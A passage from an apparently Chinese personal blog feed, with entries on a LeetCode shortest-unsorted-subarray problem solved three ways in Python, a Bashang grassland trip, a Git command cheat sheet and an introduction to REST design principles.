<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>Given an integer array, you need to find one <strong>continuous subarray</strong> that if you only sort this subarray in ascending order, then the whole array will be sorted in ascending order, too.</p>
<p>You need to find the <strong>shortest</strong> such subarray and output its length.</p>
<p><strong>Examples:</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: [2, 6, 4, 8, 10, 9, 15]</span><br><span class="line">Output: 5</span><br><span class="line">Explanation: You need to sort [6, 4, 8, 10, 9] in ascending order to make the whole array sorted in ascending order.</span><br></pre></td></tr></table></figure>
<h2 id="思路一"><a href="#思路一" class="headerlink" title="思路一"></a>思路一</h2><p>数组需要递增则：<strong>最后一个元素是数组最大值，数组第一个元素是数组最小值</strong>，则从外往内收缩直到找到不满足该条件的数组就是最短的unsorted continuous subarray</p>
<h3 id="时间复杂度"><a href="#时间复杂度" class="headerlink" title="时间复杂度"></a>时间复杂度</h3><p>每次用max(nums)查找数组元素最大或最小复杂度都是$O(n)$,则总的时间复杂度是$O(n^2)$</p>
<p>代码用时1102ms</p>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">findUnsortedSubarray</span><span class="params">(self, nums)</span>:</span></span><br><span class="line">      <span class="string">"""</span></span><br><span class="line"><span class="string">      :type nums: List[int]</span></span><br><span class="line"><span class="string">      :rtype: int</span></span><br><span class="line"><span class="string">      """</span></span><br><span class="line">      length=len(nums)</span><br><span class="line">      <span class="keyword">if</span> length&lt;=<span class="number">1</span>:</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">      <span class="keyword">if</span> nums == sorted(nums):</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">      </span><br><span class="line">      <span class="keyword">while</span>(max(nums)==nums[len(nums)<span class="number">-1</span>]):</span><br><span class="line">          nums.pop()</span><br><span class="line">      <span class="keyword">while</span>(min(nums)==nums[<span class="number">0</span>]):</span><br><span class="line">          nums.remove(nums[<span class="number">0</span>])</span><br><span class="line">      <span class="comment">#print nums</span></span><br><span class="line">      <span class="keyword">return</span> len(nums)</span><br></pre></td></tr></table></figure>
<h2 id="思路二"><a href="#思路二" class="headerlink" title="思路二"></a>思路二</h2><p>首先 从外往内收缩，排除已经递增的序列。（我原本也考虑过这个方法，但是没有想到这样做之后还是有可能不是满足条件的subarray，比如<code>[1,3,2,2,2]</code>，用这种收缩的方法的到结果是1，而正确结果应该是4 ）</p>
<p>之后要找到判断中间剩下的序列中的最大最小值，然后根据最大最小值和两端已经排好序的数组比较，重新更新subarray的长度</p>
<h3 id="时间复杂度-1"><a href="#时间复杂度-1" class="headerlink" title="时间复杂度:"></a>时间复杂度:</h3><p>第一遍收缩的过程复杂度为$O(n)$，查找最大最小值复杂度$O(n)$,最后更新操作复杂度也是$O(n)$ 代码运行时间102ms</p>
<h3 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findUnsortedSubarray</span><span class="params">(self,nums)</span>:</span></span><br><span class="line">       length = len(nums)</span><br><span class="line">       <span class="keyword">if</span> length&lt;=<span class="number">1</span>:</span><br><span class="line">           <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">       <span class="keyword">if</span> nums == sorted(nums):</span><br><span class="line">           <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">       </span><br><span class="line">       i=<span class="number">0</span></span><br><span class="line">       <span class="keyword">while</span>(i &lt;=length<span class="number">-1</span> <span class="keyword">and</span> nums[i]&lt;=nums[i+<span class="number">1</span>]):</span><br><span class="line">           i=i+<span class="number">1</span></span><br><span class="line">       j=length<span class="number">-1</span></span><br><span class="line">       <span class="keyword">while</span>(j&gt;=<span class="number">0</span> <span class="keyword">and</span> nums[j]&gt;=nums[j<span class="number">-1</span>]):</span><br><span class="line">           j=j<span class="number">-1</span></span><br><span class="line">       </span><br><span class="line">       j=j+<span class="number">1</span></span><br><span class="line">       <span class="comment">#print i,j</span></span><br><span class="line">       <span class="comment">#print nums[i:j]</span></span><br><span class="line">       min_num = min(nums[i:j])</span><br><span class="line">       max_num = max(nums[i:j])</span><br><span class="line">       <span class="comment">#print min_num,max_num</span></span><br><span class="line">       </span><br><span class="line">       <span class="keyword">while</span>(i<span class="number">-1</span> &gt;= <span class="number">0</span> <span class="keyword">and</span> nums[i<span class="number">-1</span>]&gt;min_num):</span><br><span class="line">           i=i<span class="number">-1</span></span><br><span class="line">       <span class="keyword">while</span>(j &lt; length <span class="keyword">and</span> nums[j]&lt;max_num):</span><br><span class="line">           j=j+<span class="number">1</span></span><br><span class="line">        </span><br><span class="line">       <span class="keyword">return</span> len(nums[i:j])</span><br></pre></td></tr></table></figure>
<h2 id="思路三"><a href="#思路三" class="headerlink" title="思路三"></a>思路三</h2><p>还有一个很巧妙的方法，把nums和已经排好序的nums对比，排除两端相同的序列，剩下的序列就是所求的subarray</p>
<h3 id="时间复杂度-2"><a href="#时间复杂度-2" class="headerlink" title="时间复杂度"></a>时间复杂度</h3><p>zip这个方法复杂度应该是O(n)，最后代码用时122ms</p>
<h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findUnsortedSubarray</span><span class="params">(self, nums)</span>:</span></span><br><span class="line">        is_same = [a == b <span class="keyword">for</span> a, b <span class="keyword">in</span> zip(nums, sorted(nums))]</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span> <span class="keyword">if</span> all(is_same) <span class="keyword">else</span> len(nums) - is_same.index(<span class="keyword">False</span>) - is_same[::<span class="number">-1</span>].index(<span class="keyword">False</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> 厚积薄发 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> Array </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[端午-坝上草原]]></title>
      <url>/2017/05/31/Life/%E7%AB%AF%E5%8D%88-%E5%9D%9D%E4%B8%8A%E8%8D%89%E5%8E%9F/</url>
      <content type="html"><![CDATA[<h1 id="端午-坝上草原"><a href="#端午-坝上草原" class="headerlink" title="端午-坝上草原"></a>端午-坝上草原</h1><p>不出去玩玩哪对得起端午节这么多天假？</p>
<a id="more"></a>
<p>到的时候已经凌晨1点左右了，虽然不是露营，但是还是能看到星星巨多，像上次在泰山上看到的那样，很想拍下来，但是相机没那么好，所以还是好好欣赏，把景色记在心里吧。</p>
<p>第一天上午在草原上骑马，上一次骑马还是小学毕业那年去内蒙，那时候还能骑小马驹，现在小马驹八成背不动我了吧哈哈</p>
<p>草原没有上次去内蒙时候的好看，以后还是要再去一次真正的草原的。</p>
<p><img src="/images/坝上/坝上.jpg" alt=""></p>
<p>骑马的路上还看到了彩云</p>
<p><img src="/images/坝上/彩云.jpg" alt=""></p>
<p>下午去了千松坝森林公园，人很少，走在山间小路上，可以体会到很久没有体验过的宁静。捕捉到一只九尾妖狐</p>
<p><img src="/images/坝上/妖狐.jpg" alt=""></p>
<p>晚上还放了孔明灯，小时候家里挺常见的，后来市里禁止了就再没见过了，这次还是我第一次放。</p>
<p>第二天天有点阴，原以为会影响景色，但是闪电湖景色意外的美，像水墨画一般</p>
<p><img src="/images/坝上/闪电湖.jpg" alt=""></p>
<p>很适合拍装逼的照片</p>
<p>旅行一定要有会拍照会修图的人，放几张我自己的照片吧哈哈</p>
<p><img src="/images/坝上/飞翔.jpg" alt=""></p>
<p><img src="/images/坝上/摄影师.jpg" alt=""></p>
<p>最后给草履虫打一波广告，虽然有点小贵，但是玩的特别开心，领队人很nice很周到，行程安排也很好。</p>
<p>多出去走走，读万卷书，行万里路。</p>
]]></content>
      
        
        <tags>
            
            <tag> Life </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Git]]></title>
      <url>/2017/05/24/Git/</url>
      <content type="html"><![CDATA[<p>实习的第一个任务，arc diff之后发现自己提交的与origin文件有很多在格式上的不一样，mentor让我把格式调了一下，再次提交的时候发现有一个我第一次删除过得文件还是出现在了上面，觉得Git还是不太会用啊，于是就又去学了下Git</p>
<a id="more"></a>
<p><img src="http://www.techug.com/wordpress/wp-content/uploads/2015/12/bg2015120901-1000x290.png" alt=""><br>几个专用名词：</p>
<ol>
<li>Workspace 工作区</li>
<li>Index/State 暂存区</li>
<li>Repository 仓库</li>
<li>Remote 远程仓库</li>
</ol>
<h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><h3 id="新建代码库"><a href="#新建代码库" class="headerlink" title="新建代码库"></a>新建代码库</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> 在当前目录新建一个Git代码库</span><br><span class="line"><span class="meta">$</span> git init</span><br><span class="line"><span class="meta">#</span> 下载一个项目和他的整个代码历史</span><br><span class="line"><span class="meta">$</span> git clone [url]</span><br></pre></td></tr></table></figure>
<h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> 设置在提交代码时候的用户信息</span><br><span class="line"><span class="meta">$</span> git config [--global] user.name "[name]"</span><br><span class="line"><span class="meta">$</span> git config [--global] user.email "[email address]"</span><br></pre></td></tr></table></figure>
<h3 id="添加或删除文件"><a href="#添加或删除文件" class="headerlink" title="添加或删除文件"></a>添加或删除文件</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> 添加指定文件到暂存区</span><br><span class="line"><span class="meta">$</span> git add file1 ...</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 添加当前目录的所有文件到暂存区</span><br><span class="line"><span class="meta">$</span> git add .</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 删除工作区文件，并且将这次删除放入暂存区</span><br><span class="line"><span class="meta">$</span> git rm [file1] [file2] ...</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 停止追踪指定文件，但该文件会保留在工作区</span><br><span class="line"><span class="meta">$</span> git rm --cached [file]</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 改名文件，并且将这个改名放入暂存区</span><br><span class="line"><span class="meta">$</span> git mv [file-original] [file-renamed]</span><br></pre></td></tr></table></figure>
<h3 id="代码提交"><a href="#代码提交" class="headerlink" title="代码提交"></a>代码提交</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> 提交暂存区到仓库区</span><br><span class="line"><span class="meta">$</span> git commit -m [message]</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 提交暂存区的指定文件到仓库区</span><br><span class="line"><span class="meta">$</span> git commit [file1] [file2] ... -m [message]</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 提交工作区自上次commit之后的变化，直接到仓库区</span><br><span class="line"><span class="meta">$</span> git commit -a</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 提交时显示所有diff信息</span><br><span class="line"><span class="meta">$</span> git commit -v</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 使用一次新的commit，替代上一次提交</span><br><span class="line"><span class="meta">#</span> 如果代码没有任何新变化，则用来改写上一次commit的提交信息</span><br><span class="line"><span class="meta">$</span> git commit --amend -m [message]</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 重做上一次commit，并包括指定文件的新变化</span><br><span class="line"><span class="meta">$</span> git commit --amend   ...</span><br></pre></td></tr></table></figure>
<h3 id="分支"><a href="#分支" class="headerlink" title="分支"></a>分支</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> 新建一个分支 并切换</span><br><span class="line"><span class="meta">$</span> git checkout -b [branch-name]</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 切换到指定分支，并更新工作区</span><br><span class="line"><span class="meta">$</span> git checkout [branch-name]</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 建立追踪关系，在现有分支与指定的远程分支之间</span><br><span class="line"><span class="meta">$</span> git branch --set-upstream [branch] [remote-branch]</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 合并指定分支到当前分支</span><br><span class="line"><span class="meta">$</span> git merge [branch]</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 选择一个commit，合并进当前分支</span><br><span class="line"><span class="meta">$</span> git cherry-pick [commit]</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 删除分支</span><br><span class="line"><span class="meta">$</span> git branch -d [branch-name]</span><br></pre></td></tr></table></figure>
<h3 id="查看信息"><a href="#查看信息" class="headerlink" title="查看信息"></a>查看信息</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> 显示工作区与当前分支最新commit之间的差异</span><br><span class="line"><span class="meta">$</span> git diff HEAD</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 显示两次提交之间的差异</span><br><span class="line"><span class="meta">$</span> git diff [first-branch]...[second-branch]</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 显示某次提交的元数据和内容变化</span><br><span class="line"><span class="meta">$</span> git show [commit]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 显示当前分支的最近几次提交</span><br><span class="line"><span class="meta">$</span> git reflog</span><br></pre></td></tr></table></figure>
<h3 id="远程同步"><a href="#远程同步" class="headerlink" title="远程同步"></a>远程同步</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> 下载远程仓库的所有变动</span><br><span class="line"><span class="meta">$</span> git fetch [remote]</span><br><span class="line"><span class="meta">#</span> git fetch [remote] 从远程获取最新版本到本地，不会自动merge </span><br><span class="line"><span class="meta">#</span> git pull [remove] [branch] 从远程获取最新版本并merge到本地</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 显示所有远程仓库</span><br><span class="line"><span class="meta">$</span> git remote -v</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 显示某个远程仓库的信息</span><br><span class="line"><span class="meta">$</span> git remote show [remote]</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 增加一个新的远程仓库，并命名</span><br><span class="line"><span class="meta">$</span> git remote add [shortname] [url]</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 取回远程仓库的变化，并与本地分支合并</span><br><span class="line"><span class="meta">$</span> git pull [remote] [branch]</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 上传本地指定分支到远程仓库</span><br><span class="line"><span class="meta">$</span> git push [remote] [branch]</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 强行推送当前分支到远程仓库，即使有冲突</span><br><span class="line"><span class="meta">$</span> git push [remote] --force</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 推送所有分支到远程仓库</span><br><span class="line"><span class="meta">$</span> git push [remote] --all</span><br></pre></td></tr></table></figure>
<h2 id="分支策略"><a href="#分支策略" class="headerlink" title="分支策略"></a>分支策略</h2><p>在实际开发中通常要采用一定的分支策略，master分支应该是稳定地，开发要在dev分支上完成，团队合作的分支看起来就是<img src="http://www.liaoxuefeng.com/files/attachments/001384909239390d355eb07d9d64305b6322aaf4edac1e3000/0" alt=""></p>
<p>需要将dev分支合并到master分支的命令：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> 切换到master分支</span><br><span class="line">git checkout master</span><br><span class="line"><span class="meta">#</span>对dev分支进行合并</span><br><span class="line">git merge --no-ff dev</span><br></pre></td></tr></table></figure>
<p>这里–no-ff参数是，git中默认的是fast-farward merge，会直接将Master分支指向dev分支，二者的区别如下图</p>
<p><img src="http://image.beekka.com/blog/201207/bg2012070505.png" alt="Fast-farward merge"></p>
<p><img src="http://image.beekka.com/blog/201207/bg2012070506.png" alt="no-ff merge"></p>
<p>这种方法可以保证版本演进的清晰</p>
<h2 id="把remote-master上的内容merge到自己的开发分支上"><a href="#把remote-master上的内容merge到自己的开发分支上" class="headerlink" title="把remote master上的内容merge到自己的开发分支上"></a>把remote master上的内容merge到自己的开发分支上</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git checkout master</span><br><span class="line">git pull</span><br><span class="line">git checkout dev_XXX</span><br><span class="line">git merge master</span><br></pre></td></tr></table></figure>
<h2 id="合并commit"><a href="#合并commit" class="headerlink" title="合并commit"></a>合并commit</h2><p>分支开发完成后很可能有一堆commit，但是合并到主干时候往往希望只有一个commit，这样清晰且易于管理</p>
<p>使用git rebase命令就可以合并多个commit，这里i参数表示interactive</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> git rebase -i origin/master</span><br></pre></td></tr></table></figure>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="[http://blog.csdn.net/hudashi/article/details/7664631/](http://blog.csdn.net/hudashi/article/details/7664631/">rebase和merge的区别</a></p>
<p><a href="http://www.ruanyifeng.com/blog/2014/06/git_remote.html" target="_blank" rel="noopener">Git远程操作详解</a></p>
]]></content>
      
        
        <tags>
            
            <tag> Git </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Rest & django-rest-framework]]></title>
      <url>/2017/05/19/Python/REST&amp;Django-Rest-Framework/</url>
      <content type="html"><![CDATA[<h1 id="什么是REST"><a href="#什么是REST" class="headerlink" title="什么是REST"></a>什么是REST</h1><p>来自百度的定义：REST即表述性状态传递（英文：Representational State Transfer，简称REST）是Roy Fielding博士在2000年他的博士论文中提出来的一种<a href="http://baike.baidu.com/item/%E8%BD%AF%E4%BB%B6%E6%9E%B6%E6%9E%84" target="_blank" rel="noopener">软件架构</a>风格。它是一种针对<a href="http://baike.baidu.com/item/%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8" target="_blank" rel="noopener">网络应用</a>的设计和开发方式，可以降低开发的复杂性，提高系统的可伸缩性。</p>
<a id="more"></a>
<p>先用一个简单的采购方案例子来感受一下：</p>
<p><img src="/images/django/traditional.jpg" alt=""></p>
<p>可以看到，例子中定义了两个服务程序（没有包含任何实现细节）。这些服务程序的接口都是为了完成任务（正是我们讨论的OrderManagement和CustomerManagement服务）而定制的。如果客户端程序试图使用这些服务，那它必须针对这些特定接口进行编码——不可能在这些接口定义之前，使用客户程序去有目的地和接口协作。这些接口定义了服务程序的应用协议（application protocol）</p>
<p>而在REST的设计模式中，将通过组成HTTP应用协议的通用接口访问服务程序</p>
<p><img src="/images/django/rest.jpg" alt=""></p>
<p>可以看到，服务程序中的特定操作被映射成为标准的HTTP方法——为了消除歧义，我创建了一组全新的资源。标识一个顾客的URI上的GET方法正好相当于getCustomerDetails操作。有人用三角形形象化地说明了这一点：</p>
<p><img src="/images/django/rest1.jpg" alt=""></p>
<p>可以看到在第一种方法中，你拥有许多操作，许多种类的数据以及固定数量的“实例”（本质上和你拥有的服务程序数量一致）。在第二种方法中，你拥有固定数量的操作，许多种类的数据和许多调用固定方法的对象。它的意义在于，证明了通过这两种方式，你基本上可以表示任何你喜欢的事情。</p>
<h2 id="设计原则："><a href="#设计原则：" class="headerlink" title="设计原则："></a>设计原则：</h2><h3 id="显式的使用HTTP方法"><a href="#显式的使用HTTP方法" class="headerlink" title="显式的使用HTTP方法"></a>显式的使用HTTP方法</h3><p>​    REST 要求开发人员显式地使用 HTTP 方法，并且使用方式与协议定义一致。 这个基本 REST 设计原则建立了创建、读取、更新和删除（create, read, update, and delete，CRUD）操作与 HTTP 方法之间的一对一映射<strong>（且在URL中不应该使用动词）</strong>。 根据此映射：</p>
<ul>
<li>若要在服务器上创建资源，应该使用 POST 方法。</li>
<li>若要检索某个资源，应该使用 GET 方法。</li>
<li>若要更改资源状态或对其进行更新，应该使用 PUT 方法。</li>
<li>若要删除某个资源，应该使用 DELETE 方法。</li>
</ul>
<p>e.g1：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET /adduser?name=Robert HTTP/1.1</span><br><span class="line">这是一个不好的设计，因为通过GET进行了更改操作, GET应该仅适用于检索</span><br><span class="line">，正确的方法是使用POST:</span><br><span class="line"></span><br><span class="line">POST /users HTTP/1.1</span><br><span class="line">Host: myserver</span><br><span class="line">Content-Type: application/xml</span><br><span class="line">&lt;?xml version="1.0"?&gt;</span><br><span class="line">&lt;user&gt;</span><br><span class="line">  &lt;name&gt;Robert&lt;/name&gt;</span><br><span class="line">&lt;/user&gt;</span><br></pre></td></tr></table></figure>
<p>e.g.2</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /updateuser?name=Robert&amp;newname=Bob HTTP/1.1</span><br><span class="line">通过HTTP GET进行了更新，正确做法是使用PUT</span><br><span class="line"></span><br><span class="line">PUT /users/Robert HTTP/1.1</span><br><span class="line">Host: myserver</span><br><span class="line">Content-Type: application/xml</span><br><span class="line">&lt;?xml version="1.0"?&gt;</span><br><span class="line">&lt;user&gt;</span><br><span class="line">  &lt;name&gt;Bob&lt;/name&gt;</span><br><span class="line">&lt;/user&gt;</span><br></pre></td></tr></table></figure>
<h3 id="无状态"><a href="#无状态" class="headerlink" title="无状态"></a>无状态</h3><p>​    无状态意味着 完整、独立的请求不要求服务器在处理请求时检索任何类型的应用程序上下文或状态。 REST Web 服务应用程序（或客户端）在 HTTP Header 和请求正文中包括服务器端组件生成响应所需要的所有参数、上下文和数据。</p>
<p>eg:</p>
<p><img src="/images/django/youzhuangtai.jpg" alt="有状态的设计"></p>
<p>而无状态的服务器端组件不那么复杂，很容易跨进行负载平衡的服务器进行设计、编写和分布。 无状态的服务不仅性能更好，而且还将大部分状态维护职责转移给客户端应用程序。 在基于 REST 的 Web 服务中，服务器负责生成响应，并提供使客户端能够独自维护应用程序状态的接口。 例如，在针对多页结果集的请求中，客户端应该包括要检索的实际页编号，而不是简单地要求检索<em>下一页</em>（请参见图 2）</p>
<p><img src="/images/django/wuzhuangtai.jpg" alt="无状态的设计"></p>
<h3 id="公开目录结构式的URI"><a href="#公开目录结构式的URI" class="headerlink" title="公开目录结构式的URI"></a>公开目录结构式的URI</h3><p><strong>从对资源寻址的客户端应用程序的角度看，URI 决定了 REST Web 服务将具有的直观程度，以及服务是否将以设计人员能够预测的方式被使用</strong>。 基于 REST 的 Web 服务的第三个特征完全与 URI 相关。</p>
<p>REST Web 服务 URI 的直观性应该达到很容易猜测的程度。 将 URI 看作是自身配备文档说明的接口，开发人员只需很少（如果有的话）的解释或参考资料即可了解它指向什么，并获得相关的资源。 为此，URI 的结构应该简单、可预测且易于理解。</p>
<p>实现这种级别的可用性的方法之一是定义目录结构式的 URI。 此类 URI 具有层次结构，其根为单个路径，从根开始分支的是公开服务的主要方面的子路径。 根据此定义，URI 并不只是斜杠分隔的字符串，而是具有在节点上连接在一起的下级和上级分支的树。 例如，在一个收集从 Java 到报纸的各种主题的讨论线程服务中，您可能定义类似如下的结构化 URI 集合：<br><code>http://www.myservice.org/discussion/topics/{topic}</code></p>
<p>根 <code>/discussion</code> 之下有一个 <code>/topics</code> 节点。 该节点之下有一系列主题名称，例如闲谈、技术等等，每个主题名称指向某个讨论线程。 在此结构中，只需在 /topics/ 后面输入某个内容即可容易地收集讨论线程。</p>
<p>在某些情况下，指向资源的路径尤其适合于目录式结构。 例如，以按日期进行组织的资源为例，这种资源非常适合于使用层次结构语法。</p>
<p>此示例非常直观，因为它基于规则：<br><code>http://www.myservice.org/discussion/2008/12/10/{topic}</code></p>
<p>第一个路径片段是四个数字的年份，第二个路径片断是两个数字的日期，第三个片段是两个数字的月份。 这样解释它可能有点愚蠢，但这就是我们追求的简单级别。 人类和计算机能够容易地生成类似如此的结构化 URI，因为这些 URI 基于规则。 在语法的空隙中填入路径部分就大功告成了，因为存在用于组合 URI 的明确模式：<br><code>http://www.myservice.org/discussion/{year}/{day}/{month}/{topic}</code></p>
<p>在考虑基于 REST 的 Web 服务的 URI 结构时，需要指出的一些附加指导原则包括：</p>
<ul>
<li>隐藏服务器端脚本技术文件扩展名（.jsp、.php、.asp）——如果有的话，以便您能够移植到其他脚本技术而不用更改 URI。</li>
<li>将所有内容保持小写。</li>
<li>将空格替换为连字符或下划线（其中一种或另一种）。</li>
<li>尽可能多地避免查询字符串。</li>
<li>如果请求 URI 用于部分路径，与使用 404 Not Found 代码不同，应该始终提供缺省页面或资源作为响应。</li>
</ul>
<p>URI 还应该是静态的，以便在资源发生更改或服务的实现发生更改时，链接保持不变。 这可以实现书签功能。 URI 中编码的资源之间的关系与在存储资源的位置表示资源关系的方式无关也是非常重要的。</p>
<h3 id="传输XML或者JSON"><a href="#传输XML或者JSON" class="headerlink" title="传输XML或者JSON"></a>传输XML或者JSON</h3><h2 id="In-Conclusion"><a href="#In-Conclusion" class="headerlink" title="In Conclusion"></a>In Conclusion</h2><p>REST除了给我们带来了一个崭新的架构以外，还有一个重要的贡献是在开发系统过程中的一种新的思维方式：通过url来设计系统的结构。根据REST，每个url都代表一个resource<strong>（URL中不能带有动词）</strong>，而整个系统就是由这些resource组成的。因此，如果url是设计良好的，那么系统的结构就也应该是设计良好的。</p>
